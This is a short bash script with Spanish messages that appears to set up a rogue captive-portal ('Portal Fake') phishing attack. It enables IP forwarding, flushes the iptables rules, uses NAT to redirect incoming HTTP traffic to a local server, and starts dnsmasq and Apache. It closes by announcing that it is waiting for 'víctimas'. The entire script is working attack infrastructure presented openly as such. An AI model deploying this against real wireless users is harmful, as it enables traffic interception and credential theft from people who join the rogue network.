#!/bin/bash
echo "[+] Habilitando IP Forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[+] Configurando iptables para redirigir tráfico HTTP"
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

echo "[+] Iniciando dnsmasq"
/usr/sbin/dnsmasq -C ./dnsmasq.conf

echo "[+] Iniciando servidor Apache"
systemctl start apache2

echo "[+] Portal Fake activo. Esperando víctimas..."